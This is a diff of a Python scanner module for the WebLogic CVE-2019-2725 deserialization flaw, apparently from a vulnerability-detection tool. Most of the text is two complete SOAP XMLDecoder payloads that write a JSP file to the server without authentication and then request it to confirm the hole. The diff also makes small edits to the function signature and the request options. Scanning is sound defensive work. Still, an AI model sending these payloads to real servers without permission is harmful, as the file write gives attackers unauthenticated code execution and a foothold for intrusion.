@@ -8,20 +8,20 @@ cve_2019_2725_payloads = [
     {
         'path-1': '_async/AsyncResponseService',
         'data-1': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/{FILENAME}.jsp</string><void method="println"><string><![CDATA[
-<% out.println("{RCEMD}"); %>]]>
+<% out.println("<h1>{RCEMD}</h1>"); %>]]>
 </string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>''',
         'path-2': '_async/{FILENAME}.jsp'
     },
         {
         'path-1': 'AsyncResponseService',
         'data-1': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/{FILENAME}.jsp</string><void method="println"><string><![CDATA[
-<% out.println("{RCEMD}"); %>]]>
+<% out.println("<h1>{RCEMD}</h1>"); %>]]>
 </string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>''',
         'path-2': '{FILENAME}.jsp',
     },
 ]
 
-def cve_2019_2725_scan(self, clients):
+def cve_2019_2725_scan(clients):
     ''' Weblogic 
             部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogicServer提供异步通讯服务
             由于该WAR包在反序列化处理输入信息时存在缺陷, 在未授权的情况下可以远程执行命令
@@ -29,7 +29,7 @@ def cve_2019_2725_scan(self, clients):
     client = clients.get('reqClient')
 
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Weblogic',
         'vul_type': 'unSerialization',
         'vul_id': 'CVE-2019-2725',
     }
@@ -51,6 +51,7 @@ def cve_2019_2725_scan(self, clients):
             path_1,
             data=data_1,
             headers=headers,
+            allow_redirects=False,
             vul_info=vul_info
         )
         if res1 is None:
